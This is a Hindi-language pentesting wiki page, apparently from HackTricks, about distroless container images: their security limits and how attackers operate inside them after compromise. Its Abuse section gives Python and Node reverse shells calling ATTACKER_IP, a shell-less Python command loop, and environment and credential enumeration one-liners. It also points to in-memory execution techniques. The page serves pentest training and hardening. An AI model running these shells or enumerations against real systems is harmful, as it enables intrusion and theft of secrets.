# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

एक **distroless** container image वह इमेज होती है जो एक विशेष application को चलाने के लिए आवश्यक न्यूनतम runtime components भेजती है, जबकि जानबूझकर सामान्य distribution tooling जैसे package managers, shells, और बड़े सेट के generic userland utilities को हटा देती है। व्यवहार में, distroless images अक्सर केवल application binary या runtime, उसकी shared libraries, certificate bundles, और एक बहुत ही छोटा filesystem layout ही रखते हैं।

मुद्दा यह नहीं है कि distroless कोई नया kernel isolation primitive है। Distroless एक **image design strategy** है। यह कंटेनर फाइलसिस्टम के भीतर क्या उपलब्ध है बदलता है, न कि यह कि kernel कंटेनर को कैसे अलग करता है। यह अंतर महत्वपूर्ण है, क्योंकि distroless मुख्य रूप से उस पर्यावरण को harden करता है जो हमलावर को code execution मिलने के बाद उपयोग करने के लिए कम चीजें देता है। यह namespaces, seccomp, capabilities, AppArmor, SELinux, या किसी अन्य runtime isolation mechanism की जगह नहीं लेता।

## Distroless क्यों मौजूद है

Distroless images का उपयोग основном रूप से कम करने के लिए किया जाता है:

- image size
- image की operational complexity
- उन packages और binaries की संख्या जिनमें vulnerabilities हो सकती हैं
- default रूप में उस post-exploitation tools की संख्या जो एक attacker के पास उपलब्ध हो सकते हैं

इसीलिए distroless images production application deployments में लोकप्रिय हैं। एक ऐसा container जिसमें कोई shell नहीं, कोई package manager नहीं, और लगभग कोई generic tooling नहीं होती, आमतौर पर operational रूप से समझने में आसान और compromise के बाद interactive रूप से दुरुपयोग करने में कठिन होता है।

पॉपुलर distroless-style image परिवारों के उदाहरण हैं:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless का क्या मतलब नहीं है

एक distroless container यह नहीं है कि वह:

- automatically rootless हो
- automatically non-privileged हो
- automatically read-only हो
- automatically seccomp, AppArmor, या SELinux द्वारा protected हो
- automatically container escape से सुरक्षित हो

फिर भी संभव है कि एक distroless image को `--privileged`, host namespace sharing, dangerous bind mounts, या एक mounted runtime socket के साथ चलाया जाए। उस स्थिति में इमेज minimal हो सकती है, लेकिन container फिर भी भयानक रूप से insecure हो सकता है। Distroless बदलता है **userland attack surface**, न कि **kernel trust boundary**।

## सामान्य परिचालन विशेषताएँ

जब आप एक distroless container को compromise करते हैं, तो सबसे पहली बात जो आप आमतौर पर नोटिस करते हैं वह यह है कि सामान्य मान्यताएँ काम करना बंद कर देती हैं। वहाँ शायद कोई `sh` नहीं, कोई `bash` नहीं, कोई `ls` नहीं, कोई `id` नहीं, कोई `cat` नहीं, और कभी-कभी libc-based environment भी नहीं होता जो आपकी सामान्य tradecraft की तरह व्यवहार करे। इससे offense और defense दोनों प्रभावित होते हैं, क्योंकि tooling की कमी debugging, incident response, और post-exploitation को अलग बनाती है।

सबसे सामान्य पैटर्न हैं:

- application runtime मौजूद है, लेकिन उसके अलावा बहुत कम होता है
- shell-based payloads fail हो जाते हैं क्योंकि shell नहीं है
- common enumeration one-liners fail होते हैं क्योंकि helper binaries गायब हैं
- file system protections जैसे read-only rootfs या writable tmpfs locations पर `noexec` अक्सर मौजूद होते हैं

यह संयोजन आमतौर पर लोगों को "weaponizing distroless" के बारे में बात करने के लिए ले जाता है।

## Distroless और Post-Exploitation

distroless environment में मुख्य offensive challenge हमेशा initial RCE नहीं होता। अक्सर समस्या इसके बाद आती है। अगर exploited workload किसी language runtime जैसे Python, Node.js, Java, या Go में code execution देता है, तो आप arbitrary logic execute कर सकते हैं, लेकिन वो सामान्य shell-centric workflows के माध्यम से नहीं जो अन्य Linux targets में आम होते हैं।

इसका मतलब है कि post-exploitation अक्सर तीन दिशाओं में से एक में बदल जाता है:

1. **Use the existing language runtime directly** — environment को enumerate करने, sockets खोलने, files पढ़ने, या additional payloads stage करने के लिए सीधे मौजूदा language runtime का उपयोग करें।
2. **Bring your own tooling into memory** — अगर filesystem read-only है या writable locations `noexec` पर-mounted हैं तो अपने tooling को memory में लाना।
3. **Abuse existing binaries already present in the image** — अगर application या उसकी dependencies में कुछ unexpectedly उपयोगी मौजूद है तो उसका दुरुपयोग करें।

## Abuse

### Enumerate The Runtime You Already Have

कई distroless containers में shell नहीं होता, लेकिन फिर भी application runtime मौजूद होता है। अगर target एक Python service है, तो Python वहाँ होगा। अगर target Node.js है, तो Node वहाँ होगा। इससे अक्सर files enumerate करने, environment variables पढ़ने, reverse shells खोलने, और बिना `/bin/sh` को invoke किए in-memory execution stage करने की पर्याप्त क्षमताएँ मिल जाती हैं।

Python के साथ एक सरल उदाहरण:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js के साथ एक सरल उदाहरण:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
प्रभाव:

- environment variables की पुनर्प्राप्ति, अक्सर credentials या service endpoints सहित
- filesystem enumeration `/bin/ls` के बिना
- writable paths और mounted secrets की पहचान

### Reverse Shell बिना `/bin/sh`

यदि image में `sh` या `bash` मौजूद नहीं है, तो पारंपरिक shell-based reverse shell तुरंत असफल हो सकती है। ऐसी स्थिति में, उसके बजाय इंस्टॉल किए गए language runtime का उपयोग करें।

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
यदि `/bin/sh` मौजूद नहीं है, तो अंतिम पंक्ति को प्रत्यक्ष Python-संचालित कमांड निष्पादन या Python REPL लूप से बदलें।

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
फिर से, यदि `/bin/sh` अनुपस्थित है, तो shell spawn करने के बजाय Node के filesystem, process, और networking APIs को सीधे उपयोग करें।

### पूरा उदाहरण: No-Shell Python Command Loop

अगर image में Python है लेकिन बिलकुल कोई shell नहीं है, तो एक साधारण इंटरैक्टिव लूप अक्सर पूरी post-exploitation capability बनाए रखने के लिए पर्याप्त होता है:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
यह किसी interactive shell बाइनरी की आवश्यकता नहीं रखता। हमलावर के नजरिए से प्रभाव मूल रूप से एक basic shell के समान ही है: command execution, enumeration, और मौजूदा runtime के माध्यम से आगे के payloads का staging।

### इन-मेमोरी टूल निष्पादन

Distroless images अक्सर निम्न के साथ संयोजित होते हैं:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

यह संयोजन क्लासिक "download binary to disk and run it" वर्कफ़्लो को अविश्वसनीय बना देता है। ऐसे मामलों में, memory execution techniques मुख्य उत्तर बन जाते हैं।

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### इमेज में पहले से मौजूद बाइनरी

कुछ Distroless images में अभी भी संचालन के लिए आवश्यक बाइनरी मौजूद होते हैं जो compromise के बाद उपयोगी हो जाते हैं। बार-बार देखा गया एक उदाहरण `openssl` है, क्योंकि applications कभी-कभी crypto- या TLS-related कार्यों के लिए इसकी आवश्यकता होती है।

एक त्वरित खोज पैटर्न है:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
यदि `openssl` उपलब्ध है, तो इसे निम्नलिखित के लिए उपयोग किया जा सकता है:

- आउटबाउंड TLS कनेक्शन्स
- एक अनुमत egress चैनल के माध्यम से data exfiltration
- encoded/encrypted blobs के माध्यम से staging payload data

सटीक दुरुपयोग इस बात पर निर्भर करता है कि वास्तव में क्या इंस्टॉल किया गया है, लेकिन सामान्य विचार यह है कि distroless का मतलब "कोई उपकरण बिलकुल नहीं" नहीं है; इसका मतलब "एक सामान्य distribution image की तुलना में बहुत कम उपकरण" है।

## जांच

इन checks का उद्देश्य यह निर्धारित करना है कि क्या इमेज व्यवहार में वास्तव में distroless है और कौन से runtime या helper binaries अभी भी post-exploitation के लिए उपलब्ध हैं।
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- यदि कोई shell मौजूद नहीं है लेकिन Python या Node जैसे runtime मौजूद हैं, तो post-exploitation को runtime-driven execution की ओर मोड़ना चाहिए।
- यदि root filesystem read-only है और `/dev/shm` writable है लेकिन `noexec`, memory execution techniques कहीं अधिक प्रासंगिक हो जाती हैं।
- यदि helper binaries जैसे `openssl`, `busybox`, या `java` मौजूद हैं, तो वे आगे के access को bootstrap करने के लिए पर्याप्त functionality प्रदान कर सकते हैं।

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, केवल application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, अक्सर एक runtime या service पर केंद्रित | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.

## Related Pages

distroless environments में सामान्यतः आवश्यक filesystem और memory-execution bypasses के लिए:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

container runtime, socket, और mount abuse के लिए जो अभी भी distroless workloads पर लागू होते हैं:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
